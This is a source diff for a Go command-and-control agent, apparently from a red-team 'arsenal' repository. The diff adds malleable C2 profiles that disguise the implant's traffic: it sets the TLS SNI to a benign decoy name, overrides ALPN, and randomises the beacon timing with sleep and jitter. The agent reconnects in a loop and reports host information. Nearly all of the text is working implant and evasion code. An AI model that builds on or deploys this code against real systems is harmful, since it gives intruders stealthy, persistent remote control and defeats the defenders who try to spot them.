@@ -25,6 +25,8 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+
+	"github.com/sk666G/red-sky---arsenal/internal/c2profile"
 	"time"
 
 	"github.com/sk666G/red-sky---arsenal/internal/adgo"
@@ -51,6 +53,11 @@ import (
 	"path/filepath"
 )
 
+// activeProfile is the loaded c2 profile consulted by sendEncrypted
+// and the read loop at frame time. Nil means the agent runs on
+// hardcoded defaults — no encoding, no padding.
+var activeProfile *c2profile.Profile
+
 func main() {
 	host := flag.String("host", "127.0.0.1", "core host")
 	port := flag.Int("port", 4444, "core port")
@@ -58,7 +65,20 @@ func main() {
 	caFP := flag.String("ca-fingerprint", "", "SHA-256 fingerprint of the engagement CA (colon hex)")
 	beaconSec := flag.Int("beacon", 30, "beacon interval seconds (heartbeat on the live connection)")
 	reconnectSec := flag.Int("reconnect", 10, "reconnect delay after disconnect")
+	profilePath := flag.String("profile", "", "path to malleable C2 profile JSON (optional; falls back to hardcoded defaults)")
 	flag.Parse()
+
+	var profile *c2profile.Profile
+	if *profilePath != "" {
+		var err error
+		profile, err = c2profile.Load(*profilePath)
+		if err != nil {
+			log.Fatalf("profile: %v", err)
+		}
+		log.Printf("loaded c2 profile %q (sleep=%dms jitter=%d%% encoding=%s)",
+			profile.Name, profile.SleepMS, profile.JitterPct, profile.BodyEncoding)
+		activeProfile = profile
+	}
 
 	if *caFP == "" {
 		log.Fatalf("no -ca-fingerprint given; get it from core's startup log")
@@ -81,7 +101,7 @@ func main() {
 	}
 
 	for {
-		if err := runSession(*host, *port, agentID, *caFP, *beaconSec); err != nil {
+		if err := runSession(*host, *port, agentID, *caFP, *beaconSec, profile); err != nil {
 			log.Printf("session ended: %v", err)
 		}
 		time.Sleep(time.Duration(*reconnectSec) * time.Second)
@@ -89,7 +109,7 @@ func main() {
 }
 
 // runSession opens one connection and services it until it dies.
-func runSession(host string, port int, agentID, caFP string, beaconSec int) error {
+func runSession(host string, port int, agentID, caFP string, beaconSec int, profile *c2profile.Profile) error {
 	tlsCfg, err := rsTLS.ClientTLSConfig(caFP)
 	if err != nil {
 		return fmt.Errorf("tls config: %w", err)
@@ -99,6 +119,17 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 		return fmt.Errorf("dial: %w", err)
 	}
 	defer rawConn.Close()
+	// Apply TLS-shape knobs from the profile: SNI fronts the
+	// ClientHello with a benign name; ALPN replaces Go's default
+	// protocol offer.
+	if profile != nil {
+		if profile.SNI != "" {
+			tlsCfg.ServerName = profile.SNI
+		}
+		if len(profile.ALPN) > 0 {
+			tlsCfg.NextProtos = profile.ALPN
+		}
+	}
 	conn := tls.Client(rawConn, tlsCfg)
 	if err := conn.Handshake(); err != nil {
 		return fmt.Errorf("tls handshake: %w", err)
@@ -158,13 +189,19 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 	// --- heartbeat goroutine ---
 	stopBeacon := make(chan struct{})
 	go func() {
-		t := time.NewTicker(time.Duration(beaconSec) * time.Second)
-		defer t.Stop()
+		// If a profile loaded, its SleepMS + JitterPct drive the
+		// beacon. Otherwise fall back to the -beacon flag (seconds).
+		sleepFn := func() time.Duration {
+			if profile != nil {
+				return time.Duration(profile.SleepJitterMS()) * time.Millisecond
+			}
+			return time.Duration(beaconSec) * time.Second
+		}
 		for {
 			select {
 			case <-stopBeacon:
 				return
-			case <-t.C:
+			case <-time.After(sleepFn()):
 				_ = send(proto.TypeBeacon, proto.Beacon{
 					AgentID: agentID,
 					Info:    collectInfo(),
